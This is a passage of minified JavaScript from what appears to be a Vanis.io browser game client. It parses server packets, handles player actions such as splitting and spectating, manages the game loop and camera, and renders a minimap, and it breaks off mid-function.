      if (((i.protocol = s.readUInt8()), i.protocol >= 4)) {
        (i.gamemodeId = s.readUInt8()),
          (i.seed = s.readUInt16LE()),
          (i.playerId = s.readUInt16LE()),
          (i.border.minx = s.readInt16LE()),
          (i.border.miny = s.readInt16LE()),
          (i.border.maxx = s.readInt16LE()),
          (i.border.maxy = s.readInt16LE()),
          (i.flags = s.readUInt8()),
          (i.border.width = i.border.maxx - i.border.minx),
          (i.border.height = i.border.maxy - i.border.miny),
          (i.border.circle = !!(1 & i.flags)),
          (i.border.width = i.border.maxx - i.border.minx),
          (i.border.height = i.border.maxy - i.border.miny);
        let { food: a } = i;
        if (2 & i.flags) {
          let n = (a.minSize = s.readUInt16LE()),
            o = (a.maxSize = s.readUInt16LE());
          a.stepSize = o - n;
        }
        4 & i.flags && (a.ejectedSize = s.readUInt16LE());
      } else {
        if (i.protocol >= 2)
          (i.gamemodeId = s.readUInt8()),
            (i.seed = s.readUInt16LE()),
            (i.playerId = s.readUInt16LE()),
            (i.border.width = s.readUInt32LE()),
            (i.border.height = s.readUInt32LE());
        else {
          (i.seed = s.readUInt16LE()), (i.playerId = s.readUInt16LE());
          let r = s.readUInt16LE();
          (i.border.width = r), (i.border.height = r);
        }
        (i.border.minx = -i.border.width / 2),
          (i.border.miny = -i.border.height / 2),
          (i.border.maxx = +i.border.width / 2),
          (i.border.maxy = +i.border.height / 2);
      }
      return (
        (i.border.x = (i.border.minx + i.border.maxx) / 2),
        (i.border.y = (i.border.miny + i.border.maxy) / 2),
        i
      );
    };
  }),
  (imports.MessageParsers = function (t, s, i) {
    let a = i(1),
      n = i(4),
      o = i(5),
      r = i(77),
      { encodeHTML: l } = i(8),
      c = i(144);
    (a.parseLeaderboard = (t) => {
      let s = [];
      for (;;) {
        let i = t.readUInt16LE();
        if (0 == i) {
          a.events.$emit("leaderboard-update", s);
          return;
        }
        let n = a.playerManager.getPlayer(i);
        if (!n) continue;
        let o = {
          pid: i,
          position: s.length + 1,
          text: n.name,
          color: n.nameColorCss || "#ffffff",
          bold: !!n.nameColor,
        };
        s.push(o);
      }
    }),
      (a.parseMinimap = (t) => {
        let s = [];
        for (;;) {
          let i = t.readUInt16LE();
          if (0 == i) {
            a.events.$emit("minimap-positions", s);
            return;
          }
          t.offset++;
          let n = t.readUInt8(),
            o = t.readUInt8();
          s.push({ pid: i, x: n / 255, y: o / 255 });
        }
      }),
      (a.parsePlayers = (t) => {
        let s = JSON.parse(t.readEscapedString()),
          i = s.find((t) => t.pid === a.playerId),
          n = i && a.setTagId(i.tagId),
          o = new Set();
        for (let r of s) {
          let l = a.playerManager.setPlayerData(r);
          o.add(l),
            a.events.$emit("connection-list-update", {
              ...r,
              tagId: r.tagId || 0,
              connected: !0,
            });
        }
        n &&
          (a.events.$emit("minimap-positions", []),
          a.playerManager.invalidateVisibility(o));
      }),
      (a.parseMessage = function (t) {
        switch (t.readUInt8()) {
          case 1: {
            let s = r(t);
            (a.initialDataPacket = t), a.start(s);
            return;
          }
          case 2: {
            let i = new Uint8Array(t.buffer, 1);
            a.sendHandshake(new c(i).build());
            return;
          }
          case 3: {
            let h = Date.now() - a.pingstamp;
            a.updateStats(h);
            return;
          }
          case 4:
            for (;;) {
              let d = t.readUInt16LE();
              if (0 == d) return;
              a.events.$emit("connection-list-update", {
                connected: !1,
                pid: d,
              }),
                a.playerManager.delayedRemovePlayer(d);
            }
          case 6:
            a.connection.sendOperation(6);
            return;
          case 7: {
            let u = t.readUInt8();
            a.events.$emit("crown-ownership-changed", null);
            let p, g;
            1 & u && (p = a.playerManager.getPlayer(t.readUInt16LE())),
              2 & u && (g = a.playerManager.getPlayer(t.readUInt16LE())),
              p && p.setCrown(!0),
              g && g.setCrown(!1);
            break;
          }
          case 8:
          case 9:
            return;
          case 10: {
            if (null == t.id) {
              let { ws: m } = a;
              t.id = m.packetCount++;
            }
            (gameObject.isAlive = !1), a.parseCells(t);
            let { state: A } = a,
              f = (A.isAlive = gameObject.isAlive);
            f && ((a.spectating = !1), delete a.viewSwitched);
            let { replay: C } = a;
            f && !a.replaying ? C.add(t) : C.recording() || C.clear(),
              a.events.$emit("server-tick"),
              a.playerManager.sweepRemovedPlayers();
            return;
          }
          case 11:
            a.parseLeaderboard(t);
            return;
          case 12:
            a.parseMinimap(t);
            return;
          case 13: {
            let v = { pid: t.readInt16LE(), text: t.readString16() };
            if (0 == v.pid) {
              let { selectedServer: w } = a.state;
              w &&
                /Welcome to Vanis\.io,.+\!/.test(v.text) &&
                (v.text = `Connected to ${w.region} ${w.name}`),
                a.addServerMessage(v.text);
              return;
            }
            let I = a.playerManager.getPlayer(v.pid);
            if (!I) return;
            v.from = I.name;
            let { nameColorCss: $ } = I;
            $ && (v.fromColor = $), a.events.$emit("chat-message", v);
            return;
          }
          case 14: {
            let k = t.readUInt8(),
              b = {};
            if (2 & k) {
              let S = { 1: "success", 2: "error", 3: "warning", 4: "info" }[
                t.readUInt8()
              ];
              S && (b.type = S);
            }
            4 & k && (b.timer = t.readUInt16LE()),
              (b.title = l(t.readString())),
              o.toast.fire(b);
            return;
          }
          case 15:
            for (;;) {
              let _ = t.readUInt16LE();
              if (0 == _) return;
              a.playerManager.setPlayerData({
                pid: _,
                nickname: t.readString16(),
                skinUrl: t.readString(),
              });
            }
          case 16:
            a.parsePlayers(t);
            return;
          case 17:
            (a.center.x = t.readInt16LE()), (a.center.y = t.readInt16LE());
            return;
          case 18:
            a.replay.clear(), a.clearCells();
            return;
          case 19: {
            let E = 0 != t.readUInt8();
            if ((a.events.$emit("xp-update", t.readUInt32LE()), !E)) return;
            let B = t.readUInt16LE();
            o.toast.fire({
              title: `You have reached level ${B}!`,
              type: "success",
              timer: 3e3,
            });
            return;
          }
          case 20: {
            if (a.canAutoSpectate()) {
              setTimeout(a.triggerAutoSpectate, 1500);
              return;
            }
            let { state: M } = a;
            (M.deathScreen = !0),
              a.setDeathStats({
                timeAlive: t.readUInt16LE(),
                killCount: t.readUInt16LE(),
                highscore: t.readUInt32LE(),
              }),
              n.autoRespawn && (M.isAutoRespawning = !0);
            let Q = M.isAutoRespawning ? n.respawnDelay : 900;
            a.deathTimeout = setTimeout(a.triggerAutoRespawn, Q);
            return;
          }
          case 21:
            break;
          case 22:
            if (!window.grecaptcha) {
              alert("Captcha library is not loaded");
              return;
            }
            a.events.$emit("show-image-captcha");
            break;
          case 23:
            a.state.spectators = t.readUInt16LE();
            break;
          case 24:
            a.events.$emit("restart-timing-changed", {
              currentTick: t.readUInt32LE(),
              restartTick: t.readUInt32LE(),
            });
            break;
          case 25: {
            let U = t.readString16();
            0 !== U.length && o.ltoast.fire({ title: l(U), timer: 3e3 });
            break;
          }
          case 26:
            (a.state.menu.play.active = !t.readUInt8()),
              t.length > t.offset + 1 &&
                (a.state.menu.play.text = t.readString() || "Play");
        }
      });
  }),
  (imports.Actions = function (t, s, i) {
    let a = i(1),
      n = i(4),
      { clampNumber: o } = i(8),
      r = i(142),
      l = (a.actions = new (class t {})());
    (l.spawn = () => {
      let t = SmartBuffer.fromSize(1);
      t.writeUInt8(1),
        r(t, null, a.skins),
        a.connection.send(t),
        delete a.spectating,
        delete a.viewSwitched;
    }),
      (l.spectate = (t) => {
        if (((window.app.showMenu = !1), a.state.isAlive)) return !1;
        let s = SmartBuffer.fromSize(t ? 3 : 1);
        return (
          s.writeUInt8(2),
          t && s.writeUInt16LE(t),
          a.connection.send(s),
          (a.spectating = !0),
          delete a.viewSwitched,
          !0
        );
      }),
      (l.spectateLockToggle = () => {
        a.viewSwitched || a.connection.sendOperation(10);
      }),
      (l.move = () => {
        let { x: t, y: s } = a.mouse,
          i = SmartBuffer.fromSize(5);
        i.writeUInt8(16),
          i.writeInt16LE(t),
          i.writeInt16LE(s),
          a.connection.send(i);
      }),
      (l.feed = function (t) {
        let s = arguments.length;
        if (s) {
          let i = SmartBuffer.fromSize(s ? 2 : 1);
          i.writeUInt8(21), i.writeUInt8(+t), a.connection.send(i);
        } else a.connection.sendOperation(21);
      }),
      (l.stopMovement = (t) => {
        void 0 === t && (t = !a.centralizeCells),
          t && (l.freezeMouse(!1), l.lockLinesplit(!1)),
          (a.centralizeCells = t);
      }),
      (l.freezeMouse = (t) => {
        a.running &&
          (void 0 === t && (t = !a.mouseFrozen),
          t && (l.stopMovement(!1), l.lockLinesplit(!1), a.updateMouse(!0)),
          (a.mouseFrozen = t));
      }),
      (l.lockMouse = () => {
        if (a.spectating) return;
        let t = !a.ignoreMovement;
        if (t) {
          let s = a.mouse,
            i = 0,
            n,
            o;
          for (let r of a.cells.values()) {
            if (!r.isPlayerCell || r.pid !== a.playerId) continue;
            let c = s.x - r.x,
              h = s.y - r.y,
              d = Math.hypot(c, h),
              u = r.mass / d;
            u > i && ((i = u), (n = c), (o = h));
          }
          if (i) {
            let p = Math.atan2(o, n);
            (s.x = s.x + 1e4 * Math.cos(p)),
              (s.y = s.y + 1e4 * Math.sin(p)),
              l.move();
          }
        }
        a.ignoreMovement = t;
      }),
      (l.lockLinesplit = (t) => {
        a.running &&
          (void 0 === t && (t = !a.ignoreMovement),
          t &&
            (l.move(),
            a.connection.sendOperation(15),
            l.freezeMouse(!1),
            l.stopMovement(!1)),
          (a.ignoreMovement = t));
      }),
      (l.linesplit = () => {
        if (n.legacyLinesplit) {
          let t = a.mouse,
            s = 0,
            i,
            o;
          for (let r of a.ownedCells) {
            let c = t.x - r.x,
              h = t.y - r.y,
              d = Math.hypot(c, h),
              u = r.mass / d;
            u > s && ((s = u), (i = c), (o = h));
          }
          if (s) {
            let p = Math.atan2(o, i);
            (t.x = t.x + 1e4 * Math.cos(p)),
              (t.y = t.y + 1e4 * Math.sin(p)),
              l.split(3),
              (a.pauseMovementUntil = performance.now() + 1500);
          }
        } else
          l.freezeMouse(!0),
            l.split(3),
            a.linesplitTimeout && clearTimeout(a.linesplitTimeout),
            (a.linesplitTimeout = setTimeout(() => {
              delete a.linesplitTimeout, l.freezeMouse(!1);
            }, 1500));
      }),
      (l.split = (t, s = 0) => {
        if ((a.ignoreMovement || l.move(), s))
          return setTimeout(() => l.split(t), s);
        let i = SmartBuffer.fromSize(2);
        i.writeUInt8(17),
          i.writeUInt8(t),
          a.connection.send(i),
          (a.splitCount += t),
          a.splitCount <= 2
            ? (a.pauseMovementUntil = performance.now() + 300)
            : ((a.pauseMovementUntil = 0), (a.splitCount = 0));
      }),
      (l.chat = (t) => {
        let s = SmartBuffer.fromSize(t.length + 1);
        s.writeUInt8(99), s.writeEscapedString(t), a.connection.send(s);
      }),
      (l.zoom = (t) => {
        let s = 1 - n.cameraZoomSpeed / 100,
          i = 0;
        t.detail
          ? (i = t.detail / 3)
          : t.wheelDelta && (i = -(t.wheelDelta / 120));
        let r = Math.pow(s, i);
        a.mouseZoom = o(a.mouseZoom * r, a.mouseZoomMin, 1);
      }),
      (l.setZoomLevel = (t) => {
        a.mouseZoom = 0.8 / Math.pow(2, t - 1);
      }),
      (l.chatPreset = (t) => {
        let s;
        switch (t) {
          case 1: {
            s = "I need help";
            let i = a.minimap.closestSector();
            i && (s += ` at ${i}`), (s += "!");
            break;
          }
          case 2:
            s = "Tricksplit!";
            break;
          case 3:
            s = "Linesplit!";
            break;
          case 4:
            s = "Let's bait him!";
            break;
          case 5:
            s = "I need a teammate!";
            break;
          case 6:
            s = "Feed me!";
            break;
          case 7: {
            let n = a.minimap.closestSector();
            if (!n) return;
            s = `I'm at ${n}!`;
          }
        }
        l.chat(s);
      }),
      (l.invokeMinion = (t, s) =>
        n.enableMinion && a.minion?.triggerAction(t, s)),
      (l.findPlayerUnderMouse = () => {
        let { x: t, y: s } = a.mouse,
          i = 0,
          n;
        for (let o of a.cells.values()) {
          if (!o.isPlayerCell) continue;
          let r = o.x - t,
            l = o.y - s,
            c = Math.sqrt(Math.abs(r * r + l * l)) - o.size;
          c < i && c <= 0 && ((i = o.size), (n = o));
        }
        return n;
      }),
      (l.toggleSkins = (t) => {
        void 0 === t && (t = !n.skinsEnabled),
          n.set("skinsEnabled", t),
          a.playerManager.invalidateVisibility();
      }),
      (l.toggleNames = (t) => {
        void 0 === t && (t = !n.namesEnabled),
          n.set("namesEnabled", t),
          a.playerManager.invalidateVisibility();
      }),
      (l.toggleMass = (t) => {
        void 0 === t && (t = !n.massEnabled),
          n.set("massEnabled", !n.massEnabled),
          a.playerManager.invalidateVisibility();
      }),
      (l.toggleFood = (t) => {
        void 0 === t && (t = !n.foodVisible),
          n.set("foodVisible", t),
          (a.scene.food.visible = t);
      }),
      (l.toggleHud = () => {
        let t = !window.app.showHud;
        (window.app.showHud = t), n.set("showHud", t);
      }),
      (l.toggleChat = () => {
        let t = !n.showChat;
        n.set("showChat", t), a.running && a.events.$emit("chat-visible", t);
      });
  }),
  (imports.Game = function (t, s, i) {
    let a = i(4),
      { clampNumber: n, lerp: o, hideCaptchaBadge: r } = (i(5), i(8)),
      l = i(12),
      c = i(23),
      h = i(63),
      d = i(118),
      u = i(119),
      p = i(122),
      g = i(126),
      m = i(76),
      A = i(142),
      f = (window.gameObject = new (class t {})());
    (window.gameObj = f),
      (f.clientProtocol = supportedProtocol),
      (f.events = new c()),
      (f.settings = a),
      (f.renderer = h),
      (f.usingWebGL = h.type === PIXI.RENDERER_TYPE.WEBGL),
      (f.skinLoader = new g()),
      l.virus.loadVirusFromUrl(a.virusImageUrl),
      (f.state = {
        connectionUrl: null,
        selectedServer: null,
        spectators: 0,
        isAlive: !1,
        menu: null,
        deathScreen: !1,
        isAutoRespawning: !1,
        visible: !0,
      }),
      (document.body.oncontextmenu = (t) => t.target?.id === "email"),
      (f.start = function (t) {
        if (!t.protocol || !t.seed || !t.playerId || !t.border)
          throw Error("Lacking mandatory data");
        if (
          ((f.running = !0),
          (f.replaying = !!t.replayUpdates),
          (f.protocol = t.protocol),
          (f.gamemodeId = t.gamemodeId || 0),
          (f.serverSeed = t.seed),
          (f.pingstamp = 0),
          (f.timestamp = 0),
          (f.playerId = t.playerId),
          (f.tagId = null),
          (f.spectating = !1),
          (f.state.spectators = 0),
          (f.state.isAlive = !1),
          (f.score = 0),
          (f.cellCount = 0),
          (f.cells = new Map()),
          (f.ownedCells = new Set()),
          (f.destroyedCells = []),
          (f.center = { x: 0, y: 0 }),
          (f.rawMouse = {}),
          (f.mouse = {}),
          (f.border = t.border),
          (f.food = t.food),
          (f.mouseZoom = 0.09),
          (f.mouseZoomMin = 0.01),
          (f.massTextPool = []),
          (f.crownPool = []),
          (f.renderer.backgroundColor = PIXI.utils.string2hex(
            a.backgroundColor
          )),
          (f.scene = new u(f, f.border)),
          (f.camera = new d(f.scene.container)),
          f.camera.position.set(t.border.x, t.border.y),
          f.camera.scale.set(f.mouseZoom),
          (f.playerManager = new p(f)),
          (f.ticker = new PIXI.Ticker()),
          f.ticker.add(f.onTick),
          (a.respawnDelay = a.getDefault("respawnDelay")),
          f.state.connectionUrl !== f.state.selectedServer?.url &&
            (f.state.selectedServer = null),
          f.replaying)
        ) {
          let { playback: s } = f,
            i = t.replayUpdates;
          s.set(i),
            (f.moveInterval = setInterval(s.next.bind(s), 40)),
            f.events.$emit("show-replay-controls", i.length),
            f.events.$emit("minimap-stats-visible", !1);
        } else {
          if (
            ((f.splitCount = 0),
            (f.pauseMovementUntil = 0),
            (f.ignoreMovement = !1),
            (f.centralizeCells = !1),
            (f.mouseFrozen = !1),
            a.minimapEnabled && f.events.$emit("minimap-show"),
            f.events.$emit("connection-list-visible", a.showPlayerList),
            f.events.$emit("chat-visible", a.showChat),
            f.events.$emit("leaderboard-show"),
            f.events.$emit("stats-visible", !0),
            (f.moveInterval = setInterval(() => {
              a.enableMinion && f.minion?.move(),
                f.ignoreMovement ||
                  (f.centralizeCells
                    ? f.connection.sendOperation(9)
                    : f.actions.move());
            }, Math.min(a.movementDelay, 10))),
            f.events.$on("every-second", f.everySecond),
            f.setupMenu(),
            a.enableMinion)
          ) {
            let n = (f.minion = new m(f)),
              o;
            f.joinDebounce
              ? (o = 150 * Math.random())
              : ((o = 0), (f.joinDebounce = !0)),
              setTimeout(n.open(f.state.connectionUrl), o),
              setTimeout(() => {
                delete f.joinDebounce;
              }, 3e3);
          }
          if (f.startAction) {
            switch (f.startAction) {
              case 1:
                f.actions.spawn();
                break;
              case 2:
                f.actions.spectate();
            }
            f.showMenu(!1), delete f.startAction;
          }
        }
        f.ticker.start(), f.events.$emit("game-started");
      }),
      (f.setupMenu = () => {
        f.state.menu = { play: { text: "Play", active: !0 }, active: !0 };
      }),
      (f.playbackOld = new (class t {
        set(t) {
          (this.updates = t), (this.index = 0);
        }
        start() {
          (f.moveInterval = setInterval(this.update.bind(this), 40)),
            f.events.$emit("show-replay-controls", this.updates.length),
            f.events.$emit("minimap-stats-visible", !1);
        }
        stop() {
          clearInterval(f.moveInterval), delete f.moveInterval;
        }
        next() {
          let t = this.updates[this.index++];
          f.parseMessage(new SmartBuffer(t));
        }
        seek(t) {
          let s = this.updates.length - 1,
            i = Math.floor(t * s);
          if (i === this.index) return;
          let a = this.updates[i],
            n = [];
          for (let o of f.cells.values()) o.initialUpdate > a.id && n.push(o);
          for (; n.length; ) n.pop().destroy();
          for (; this.index < i; ) {
            let r = this.updates[this.index++];
            f.parseMessage(new SmartBuffer(r));
          }
          (this.index = i), f.parseMessage(new SmartBuffer(a));
        }
        update() {
          this.index >= this.updates.length && this.seek(0),
            f.events.$emit("replay-index-change", this.index),
            this.next();
        }
      })()),
      (f.updateStats = (t) => {
        f.events.$emit("stats-changed", {
          ping: t,
          fps: Math.round(f.ticker.FPS),
          mass: f.score,
          score: f.highscore,
          minionMass: a.enableMinion ? f.minion?.alive && f.minion.mass : null,
        });
        let s = f.playerManager.playerCount,
          i = f.state.spectators;
        f.events.$emit("minimap-stats-changed", {
          playerCount: s,
          spectators: i,
        });
      }),
      (f.everySecond = () => {
        !a.antiAfk && (window.app.showMenu || window.app.showDeathScreen)
          ? f.updateStats(null)
          : f.connection.ping();
      }),
      (f.clearCells = () => {
        for (let t of f.cells.values()) t.destroy();
        for (; f.destroyedCells.length; )
          f.destroyedCells.pop().destroySprite();
      }),
      (f.destroySpritePool = (t, s) => {
        for (; t.length; ) t.pop().destroy(s);
      }),
      (f.stop = () => {
        console.assert(f.running, "Game already stopped?"),
          (f.running = !1),
          f.minion && (f.minion.destroy(), delete f.minion),
          f.setupMenu(),
          delete f.running,
          delete f.replaying,
          delete f.protocol,
          delete f.gamemodeId,
          delete f.serverSeed,
          delete f.pingstamp,
          delete f.timestamp,
          delete f.playerId,
          delete f.tagId,
          delete f.spectating,
          (f.state.spectators = 0),
          (f.state.isAlive = !1),
          delete f.score,
          delete f.highscore,
          delete f.cellCount,
          delete f.center,
          f.clearCells(),
          delete f.cells,
          delete f.ownedCells,
          delete f.destroyedCells,
          delete f.rawMouse,
          delete f.mouse,
          delete f.border,
          delete f.mouseZoom,
          delete f.mouseZoomMin,
          delete f.camera,
          f.ticker.stop(),
          delete f.ticker,
          delete f.splitCount,
          delete f.pauseMovementUntil,
          delete f.centralizeCells,
          delete f.mouseFrozen,
          clearInterval(f.moveInterval),
          delete f.moveInterval,
          f.events.$off("every-second", f.everySecond),
          f.skinLoader.clearCallbacks(),
          f.events.$emit("connection-list-clear"),
          f.events.$emit("connection-list-visible", !1),
          f.events.$emit("minimap-stats-visible", !0),
          f.events.$emit("stats-visible", !1),
          f.events.$emit("chat-visible", !1),
          f.events.$emit("leaderboard-hide"),
          f.events.$emit("minimap-hide"),
          f.events.$emit("minimap-destroy"),
          f.events.$emit("show-replay-controls", !1),
          f.events.$emit("cells-changed", 0),
          f.events.$emit("minion-cells-changed", 0),
          f.events.$emit("game-stopped"),
          f.playerManager.destroy(),
          delete f.playerManager,
          f.scene && (f.scene.destroy(), delete f.scene),
          (f.renderer.backgroundColor = 1052688),
          f.renderer.clear(),
          l.cells.clearCache(),
          l.squares.clearCache(),
          f.destroySpritePool(f.massTextPool, !0),
          f.destroySpritePool(f.crownPool),
          delete f.massTextPool,
          delete f.crownPool,
          delete f.startAction;
      }),
      (f.showMenu = (t) => {
        if (window.app.showDeathScreen) return !1;
        if (
          ((window.app.showMenu = t),
          f.actions.stopMovement(t),
          f.actions.invokeMinion("stopMovement", t),
          t)
        )
          f.events.$emit("menu-opened");
        else {
          let s = document.activeElement;
          s?.id !== "chatbox-input" && f.renderer.view.focus(),
            (f.ignoreMovement = !1),
            r();
        }
        return t;
      }),
      (f.toggleMenu = () => f.showMenu(!window.app.showMenu)),
      (f.triggerAutoRespawn = () => {
        f.state.isAlive
          ? (f.state.deathScreen = !1)
          : (clearTimeout(f.deathTimeout),
            delete f.deathTimeout,
            f.state.isAutoRespawning
              ? ((f.state.deathScreen = !1), f.actions.spawn())
              : (f.showMenu(!1), f.showDeathScreen(!0)),
            (f.state.isAutoRespawning = !1));
      }),
      (f.showDeathScreen = (t) => {
        window.app.showDeathScreen = t;
      }),
      (f.setDeathStats = (t) => {
        window.app.deathStats = t;
      }),
      (f.onTick = (t) => {
        f.deltaTime = t;
        let s = (f.timestamp = performance.now());
        s >= f.pauseMovementUntil && (f.updateMouse(), (f.splitCount = 0));
        let i = a.enableMinion ? f.minion : null;
        i &&
          s >= i.pauseMovementUntil &&
          (i.updatePosition(gameObject.rawMouse), (i.splitCount = 0));
        let { cells: n, destroyedCells: o, ownedCells: r } = f,
          l = o.length;
        for (; l--; ) {
          let c = o[l];
          c.update() && (c.destroySprite(), o.splice(l, 1));
        }
        let h;
        for (h of n.values()) h.update();
        i && i.tick();
        let d = r.size;
        f.cellCount != d &&
          ((f.cellCount = d), f.events.$emit("cells-changed", d)),
          f.cells.forEach((t) => t.update()),
          i && i.tick(),
          f.scene.sort();
        let u = f.updateCamera();
        u
          ? ((f.score = u), (f.highscore = Math.max(u, f.highscore || 0)))
          : ((f.score = 0), f.viewSwitched || delete f.highscore),
          f.renderer.render(f.scene.container);
      }),
      (f.updateCamera = () => {
        let t = 0,
          s = 0,
          i = 0,
          n = f.mouseZoom,
          { camera: r } = f;
        if (f.spectating || f.viewSwitched) {
          let { x: l, y: c } = f.center;
          (t = l), (s = c), (i = NaN);
        } else {
          if (0 === f.cellCount) return NaN;
          let h = 0,
            d;
          for (d of f.ownedCells) {
            let u = d.mass;
            (t += d.x * u), (s += d.y * u), (i += u), (h += d.nSize);
          }
          if (i)
            (t /= i),
              (s /= i),
              a.autoZoom && (n *= Math.pow(Math.min(64 / h, 1), 0.27));
          else {
            let { position: p } = r;
            (t = p.x), (s = p.y);
          }
        }
        let g = a.cameraMoveSmoothing * f.deltaTime;
        (f.camera.position.x = o(f.camera.position.x, t, g)),
          (f.camera.position.y = o(f.camera.position.y, s, g));
        let m = o(f.camera.scale.x, n, a.cameraZoomSmoothing * f.deltaTime);
        return f.camera.scale.set(m), i;
      }),
      (f.updateMouse = (t = !1) => {
        if (f.mouseFrozen && !t) return;
        let { camera: s } = f,
          { x: i, y: a } = f.rawMouse;
        (f.mouse.x = n(
          s.position.x + (i - window.innerWidth / 2) / s.scale.x,
          -32768,
          32767
        )),
          (f.mouse.y = n(
            s.position.y + (a - window.innerHeight / 2) / s.scale.y,
            -32768,
            32767
          ));
      }),
      (f.sendHandshake = (t) => {
        let s = SmartBuffer.fromSize(2 + t.length);
        s.writeUInt8(5),
          s.writeUInt8(f.clientProtocol),
          t.forEach((t) => s.writeUInt8(t)),
          A(s, null, f.skins);
        let i = localStorage.vanisToken;
        i && s.writeStringNT(i), f.connection.send(s);
      }),
      (f.seededRandom = (t) =>
        (t = Math.sin(t) * (1e4 + f.serverSeed)) - Math.floor(t)),
      (f.createThumbnail = (t = 240, s = 135) => {
        let i = f.scene.container,
          n = new PIXI.Container();
        (n.pivot.x = i.position.x),
          (n.pivot.y = i.position.y),
          (n.position.x = t / 2),
          (n.position.y = s / 2),
          n.scale.set(0.25),
          n.addChild(i);
        let { renderer: o } = f,
          r = PIXI.RenderTexture.create(t, s);
        o.render(n, r), n.removeChild(i);
        let l = o.plugins.extract.canvas(r),
          c = document.createElement("canvas");
        (c.width = t), (c.height = s);
        let h = c.getContext("2d");
        h.beginPath(),
          h.rect(0, 0, t, s),
          (h.fillStyle = "#" + a.backgroundColor),
          h.fill(),
          h.drawImage(l, 0, 0, t, s);
        let d = c.toDataURL();
        return n.destroy(!0), d;
      }),
      (f.addServerMessage = (t) => {
        "Too frequent chat messages" === t &&
          (t = "You're chatting too frequently"),
          f.events.$emit("chat-message", {
            from: "SERVER",
            fromColor: "#5f5f5f",
            text: t,
          });
      }),
      (f.setTagId = (t) => {
        if ((t || (t = null), f.tagId !== t)) return (f.tagId = t), !0;
      }),
      (f.getShortMass = (t) =>
        t < 1e3
          ? t.toString()
          : t >= 1e3 && t <= 1e9
          ? +(t / 1e3).toFixed(1) + "k"
          : t >= 1e6 && t < 1e9
          ? +(t / 1e6).toFixed(1) + "m"
          : void 0),
      (f.triggerAutoSpectate = () => {
        if (f.spectating || f.state.isAlive) return;
        let { center: t, camera: s } = f,
          { x: i, y: a } = s.position;
        (t.x = i), (t.y = a), (f.viewSwitched = !0);
        let n = SmartBuffer.fromSize(3);
        n.writeUInt8(2),
          n.writeUInt16LE(f.minion.playerId),
          f.connection.send(n);
      }),
      (f.canAutoSpectate = () =>
        a.autoSpectate && a.enableMinion && f.minion?.viewable),
      setInterval(() => f.events.$emit("every-minute"), 6e4),
      setInterval(() => f.events.$emit("every-second"), 1e3),
      f.setupMenu(),
      (t.exports = f);
  }),
  (imports.Minimap = function (t, s, i) {
    let a = i(1),
      n = i(4),
      { destroyPixiPlugins: o, lerp: r } = i(8),
      l = n.minimapSize,
      c = n.minimapFPS,
      h = n.minimapSmoothing,
      d = () => new Date().toLocaleTimeString(),
      u = (t, s = !1) => {
        if (s && t < 1) return "now";
        t = Math.floor(t);
        let i = Math.floor(t / 60),
          a = Math.floor(i / 60);
        return i < 1
          ? s
            ? t + "s"
            : "<1min"
          : a < 1
          ? i + "min"
          : i % 60 == 0
          ? a + "hr"
          : a + "hr " + (i % 60) + "min";
      },
      p = (t, s) => {
        let i = t.x - s.x,
          a = t.y - s.y;
        return i * i + a * a;
      };
    t.exports = {
      data: () => ({
        showMinimap: !1,
        showMinimapStats: !0,
        showLocations: n.minimapLocations,
        interval: null,
        minimapStatsBottom: 10,
        showClock: n.showClock,
        showSessionTime: n.showSessionTime,
        showSpectators: n.showSpectators,
        showPlayerCount: n.showPlayerCount,
        showRestartTiming: n.showRestartTiming,
        showCrownHolder: n.showCrownHolder,
        systemTime: d(),
        sessionTime: u(0),
        restartTime: u(0, !0),
        spectators: 0,
        playerCount: 0,
        currentTick: 0,
        restartTick: 0,
        crownHolder: null,
        startTime: null,
        everySecond: null,
        gameState: a.state,
        locations: [],
        players: new Map(),
        lastKnownChild: null,
        container: new PIXI.Container(),
      }),
      computed: {
        playerCountDisplayed() {
          if (this.gameState.selectedServer) {
            let t = this.gameState.selectedServer.slots;
            return `${Math.min(this.playerCount, t)} / ${t} players`;
          }
          return `${this.playerCount} player${
            1 === this.playerCount ? "" : "s"
          }`;
        },
      },
      methods: {
        initRenderer(t) {
          let s = (this.renderer = PIXI.autoDetectRenderer({
            resolution: 1,
            view: t,
            width: l,
            height: l,
            forceCanvas: !n.useWebGL,
            antialias: !1,
            powerPreference: "high-performance",
            transparent: !0,
          }));
          o(s), s.clear();
        },
        onMinimapShow() {
          this.interval ||
            ((this.showMinimap = !0),
            (this.minimapStatsBottom = l + 10),
            a.events.$on("minimap-positions", this.updatePositions),
            (this.interval = setInterval(this.render, 1e3 / c)));
        },
        onMinimapHide() {
          this.interval &&
            ((this.showMinimap = !1),
            (this.minimapStatsBottom = 10),
            a.events.$off("minimap-positions", this.updatePositions),
            clearInterval(this.interval),
            delete this.interval,
            (this.lastKnownChild = null),
            (this.crownHolder = null),
            (this.spectators = 0),
            (this.playerCount = 0));
        },
        destroyMinimap() {
          this.container.destroy(!0),
            (this.container = new PIXI.Container()),
            this.renderer.clear();
        },
        createNode(t, s, i, a, n) {
          this.players.has(t) && this.destroyNode(t),
            (i = i || 16777215),
            (a = a || 16777215);
          let o = new PIXI.Container();
          (o.newPosition = {}), (o.isMe = n);
          let r = new PIXI.Graphics()
            .beginFill(a)
            .drawCircle(0, 0, 5)
            .endFill();
          if ((o.addChild(r), s)) {
            let l = new PIXI.Text(s, {
              strokeThickness: 4,
              lineJoin: "round",
              fontFamily: "Nunito",
              fill: i,
              fontSize: 12,
            });
            l.anchor.set(0.5), (l.pivot.y = 15), o.addChild(l);
          }
          this.players.set(t, o);
        },
        destroyNode(t) {
          if (!this.players.has(t)) {
            console.warn("Minimap: trying to destroy node which doesn't exist");
            return;
          }
          let s = this.players.get(t);
          s.destroy(!0), this.players.delete(t);
        },
        updatePositions(t) {
          for (let s of (this.container.removeChildren(), t)) {
            if (!this.players.has(s.pid)) {
              console.warn("Minimap: node not found!");
              continue;
            }
            let i = this.players.get(s.pid);
            (i.newPosition.x = s.x * l),
              (i.newPosition.y = s.y * l),
              this.container.addChild(i);
          }
          this.render();
        },
        render() {
          let t = h * (60 / c),
            s;
          for (let i of this.container.children)
            (i.position.x = r(i.position.x, i.newPosition.x, t)),
              (i.position.y = r(i.position.y, i.newPosition.y, t)),
              i.isMe && (s = i);
          (this.lastKnownChild = s), this.renderer.render(this.container);
        },
        drawLocationGrid(t, s) {
          (t.globalAlpha = 0.3), (t.strokeStyle = "#3f3f3f"), t.beginPath();
          let i = l / s;
          for (let a = 1; a < s; a++) {
            let n = a * i;
            t.moveTo(n, 0), t.lineTo(n, l), t.moveTo(0, n), t.lineTo(l, n);
          }
          t.stroke(), t.closePath();
        },
        drawLocationCodes(t, s) {
          (t.globalAlpha = 0.4),
